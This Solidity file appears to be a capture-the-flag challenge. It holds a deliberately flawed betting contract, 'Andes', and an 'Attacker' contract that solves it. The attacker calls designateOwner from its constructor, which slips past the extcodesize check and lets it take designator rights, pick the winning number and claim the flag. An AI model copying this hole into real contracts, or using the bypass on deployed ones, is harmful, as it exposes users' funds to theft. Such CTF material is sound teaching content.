pragma solidity ^0.7.6;

contract Andes {
    // designators can designate an address to be the next random
    // number selector
    mapping(address => bool) designators;
    mapping(address => uint256) balances;

    address selector;
    uint8 private nextVal;
    address[8][8] bids;

    event Registered(address, uint256);
    event RoundFinished(address);
    event GetFlag(bytes32);

    constructor() {
        designators[msg.sender] = true;
        _resetBids();
    }

    modifier onlyDesignators() {
        require(designators[msg.sender] == true, "Not owner");
        _;
    }

    function register() public {
        require(balances[msg.sender] < 10);

        balances[msg.sender] = 50;

        emit Registered(msg.sender, 50);
    }

    function setNextSelector(address _selector) public onlyDesignators {
        require(_selector != msg.sender);
        selector = _selector;
    }

    function setNextNumber(uint8 value) public {
        require(selector == msg.sender);

        nextVal = value;
    }

    function _resetBids() private {
        for (uint256 i = 0; i < 8; i++) {
            for (uint256 j = 0; j < 8; j++) {
                bids[i][j] = address(0);
            }
        }
    }

    function purchaseBid(uint8 bid) public {
        require(balances[msg.sender] > 10);
        require(msg.sender != selector);

        uint256 row = bid % 8;
        uint256 col = bid / 8;

        if (bids[row][col] == address(0)) {
            balances[msg.sender] -= 10;
            bids[row][col] = msg.sender;
        }
    }

    function playRound() public onlyDesignators {
        address winner = bids[nextVal % 8][nextVal / 8];

        balances[winner] += 1000;
        _resetBids();

        emit RoundFinished(winner);
    }

    function getFlag(bytes32 token) public {
        require(balances[msg.sender] >= 1000);

        emit GetFlag(token);
    }

    function _canBeDesignator(address _addr) private view returns (bool) {
        uint256 size = 0;

        assembly {
            size := extcodesize(_addr)
        }

        return size == 0 && tx.origin != msg.sender;
    }

    function designateOwner() public {
        require(_canBeDesignator(msg.sender));
        require(balances[msg.sender] > 0);

        designators[msg.sender] = true;
    }

    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }
}

contract Attacker {
    Andes andes;

    // debug event
    event Balance(uint256);

    constructor(address _andes) {
        andes = Andes(_andes);
        andes.register();
        andes.designateOwner();
    }

    function attack(uint8 bid) public {
        andes.purchaseBid(bid);
        andes.playRound();

        // debug log the current balance
        emit Balance(andes.getBalance());
    }

    function getFlag(bytes32 token) public {
        andes.getFlag(token);
    }
}
